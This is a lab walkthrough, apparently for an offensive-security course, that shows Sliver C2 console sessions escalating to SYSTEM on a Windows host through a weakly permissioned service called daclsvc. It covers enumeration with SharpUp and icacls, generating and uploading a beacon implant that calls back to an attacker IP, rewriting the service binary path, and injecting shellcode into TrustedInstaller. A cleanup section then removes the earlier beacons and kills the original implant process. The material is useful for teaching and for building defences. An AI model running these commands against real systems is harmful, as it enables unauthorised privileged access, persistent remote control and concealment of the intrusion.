# Sliver

## 01 - Detect

### 1.1 - Armory Extension

```
sliver (WISE_DISGUISE) > whoami

Logon ID: TCM-PC\user
[*] Tasked beacon WISE_DISGUISE (a702113f)

sliver (WISE_DISGUISE) > sharpup audit ModifiableServices

[*] Tasked beacon WISE_DISGUISE (7a8b3c07)

[+] WISE_DISGUISE completed task 7a8b3c07

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Services ===
        Service 'daclsvc' (State: Stopped, StartMode: Manual)
        [X] Exception: Exception has been thrown by the target of an invocation.
        [X] Exception: Exception has been thrown by the target of an invocation.



[*] Completed Privesc Checks in 6 seconds
```

## 02 - Exploit

```
sliver (WISE_DISGUISE) > execute -o sc qc daclsvc

⚠️  Using --output in beacon mode, if the command blocks the task will never complete

[*] Tasked beacon WISE_DISGUISE (46511084)

[+] WISE_DISGUISE completed task 46511084

[*] Output:
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

sliver (WISE_DISGUISE) > execute -o icacls "C:\\Program Files\\DACL Service\\daclservice.exe"

⚠️  Using --output in beacon mode, if the command blocks the task will never complete

[*] Tasked beacon WISE_DISGUISE (281fe137)

[+] WISE_DISGUISE completed task 281fe137

[*] Output:
C:\Program Files\DACL Service\daclservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                              BUILTIN\Administrators:(I)(F)
                                              BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files


sliver (WISE_DISGUISE) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -f service

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[*] Implant saved to /home/user/DUAL_MEET.exe

sliver (WISE_DISGUISE) > upload DUAL_MEET.exe c:/users/user/documents/daclservice.exe

[*] Tasked beacon WISE_DISGUISE (178ab857)

[+] WISE_DISGUISE completed task 178ab857

[*] Wrote file to c:\users\user\documents\daclservice.exe

sliver (WISE_DISGUISE) > execute -o sc config daclsvc binpath= c:\\users\\user\\documents\\daclservice.exe

⚠️  Using --output in beacon mode, if the command blocks the task will never complete

[*] Tasked beacon WISE_DISGUISE (eba8c115)

[+] WISE_DISGUISE completed task eba8c115

[*] Output:
[SC] ChangeServiceConfig SUCCESS

sliver (WISE_DISGUISE) > execute -o sc qc daclsvc

⚠️  Using --output in beacon mode, if the command blocks the task will never complete

[*] Tasked beacon WISE_DISGUISE (e2a3ef2e)

[+] WISE_DISGUISE completed task e2a3ef2e

[*] Output:
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : c:\users\user\documents\daclservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

sliver (WISE_DISGUISE) > execute sc start daclsvc

[*] Tasked beacon WISE_DISGUISE (582eb35f)

[+] WISE_DISGUISE completed task 582eb35f

[*] Beacon c05b8872 DUAL_MEET - 10.10.207.66:49435 (TCM-PC) - windows/amd64 - Thu, 24 Nov 2022 08:12:41 EST

sliver (WISE_DISGUISE) > use c05b8872-483a-4cfe-9a99-aa7b185a1d71

[*] Active beacon DUAL_MEET (c05b8872-483a-4cfe-9a99-aa7b185a1d71)

sliver (DUAL_MEET) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Tasked beacon DUAL_MEET (f4e3ac1f)

[+] DUAL_MEET completed task f4e3ac1f
```

## 03 - Cleanup

```
sliver (DUAL_MEET) > ps

[*] Tasked beacon DUAL_MEET (f661fe30)

[+] DUAL_MEET completed task f661fe30

 Pid    Ppid   Owner                          Arch     Executable             Session
====== ====== ============================== ======== ====================== =========
 0      0                                              [System Process]
 4      0                                     x86_64   System
 404    4      NT AUTHORITY\SYSTEM            x86_64   smss.exe
 540    532    NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 588    532    NT AUTHORITY\SYSTEM            x86_64   wininit.exe
 596    580    NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 624    580    NT AUTHORITY\SYSTEM            x86_64   winlogon.exe
 684    588    NT AUTHORITY\SYSTEM            x86_64   services.exe
 692    588    NT AUTHORITY\SYSTEM            x86_64   lsass.exe
 704    588    NT AUTHORITY\SYSTEM            x86_64   lsm.exe
 788    684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 852    684    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 936    624    NT AUTHORITY\SYSTEM            x86_64   LogonUI.exe
 952    684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1004   684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 384    684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 544    684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1092   684    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 1224   684    NT AUTHORITY\SYSTEM            x86_64   spoolsv.exe
 1252   684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1364   684    NT AUTHORITY\SYSTEM            x86_64   amazon-ssm-agent.exe
 1476   684    NT AUTHORITY\SYSTEM            x86_64   LiteAgent.exe
 1504   684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1652   684    NT AUTHORITY\SYSTEM            x86_64   Ec2Config.exe
 1952   684    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 1972   684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 1064   788    NT AUTHORITY\NETWORK SERVICE   x86_64   WmiPrvSE.exe
 2588   684    NT AUTHORITY\SYSTEM            x86_64   TrustedInstaller.exe
 2820   2812   NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 2844   2812   NT AUTHORITY\SYSTEM            x86_64   winlogon.exe
 2132   684    TCM-PC\user                    x86_64   taskhost.exe
 2428   1092   TCM-PC\user                    x86_64   rdpclip.exe
 2616   1004   TCM-PC\user                    x86_64   dwm.exe
 2640   2476   TCM-PC\user                    x86_64   explorer.exe
 2008   684    NT AUTHORITY\SYSTEM            x86_64   SearchIndexer.exe
 2004   684    NT AUTHORITY\NETWORK SERVICE   x86_64   sppsvc.exe
 1460   684    NT AUTHORITY\NETWORK SERVICE   x86_64   wmpnetwk.exe
 4028   2572   TCM-PC\user                    x86_64   powershell.exe
 1384   2820   TCM-PC\user                    x86_64   conhost.exe
 3980   2640   TCM-PC\user                    x86_64   WISE_DISGUISE.exe
 4064   788    TCM-PC\user                    x86_64   slui.exe
 464    684    NT AUTHORITY\SYSTEM            x86_64   daclservice.exe


sliver (DUAL_MEET) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -G -a x64 -o windows -f shellcode

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[!] Shikata ga nai encoder is disabled
[*] Implant saved to /home/user/PRIOR_MATERIAL.bin

sliver (DUAL_MEET) > execute-shellcode -p 2588 PRIOR_MATERIAL.bin

[*] Tasked beacon DUAL_MEET (b48dc655)

[+] DUAL_MEET completed task b48dc655

[*] Executed shellcode on target

[*] Beacon 45cec58b PRIOR_MATERIAL - 10.10.207.66:49551 (TCM-PC) - windows/amd64 - Thu, 24 Nov 2022 08:20:55 EST

sliver (DUAL_MEET) > background

[*] Background ...
```

Terminate previous beacons

```
sliver > beacons rm

? Select a beacon: c05b8872-483a-4cfe-9a99-aa7b185a1d71  DUAL_MEET       10.10.207.66:49435  TCM-PC  NT AUTHORITY\SYSTEM  windows/amd64
[*] Beacon removed (c05b8872-483a-4cfe-9a99-aa7b185a1d71)

sliver > beacons rm

? Select a beacon: 4a088b24-2875-4d70-a917-1720715c2b22  WISE_DISGUISE   10.10.207.66:49340  TCM-PC  TCM-PC\user          windows/amd64
[*] Beacon removed (4a088b24-2875-4d70-a917-1720715c2b22)

sliver > use 45cec58b-dfc1-4a98-9396-1b68fd2fa49a

[*] Active beacon PRIOR_MATERIAL (45cec58b-dfc1-4a98-9396-1b68fd2fa49a)
```

Switch to interactive mode

```
sliver (PRIOR_MATERIAL) > interactive

[*] Using beacon's active C2 endpoint: mtls://10.9.19.98:8888
[*] Tasked beacon PRIOR_MATERIAL (e54aa8ec)

[*] Session 422db3d5 PRIOR_MATERIAL - 10.10.207.66:49634 (TCM-PC) - windows/amd64 - Thu, 24 Nov 2022 08:26:51 EST

sliver (PRIOR_MATERIAL) > sessions -i 4

[*] Active session PRIOR_MATERIAL (422db3d5)

sliver (PRIOR_MATERIAL) > terminate 3980

[*] Process 3980 has been terminated
```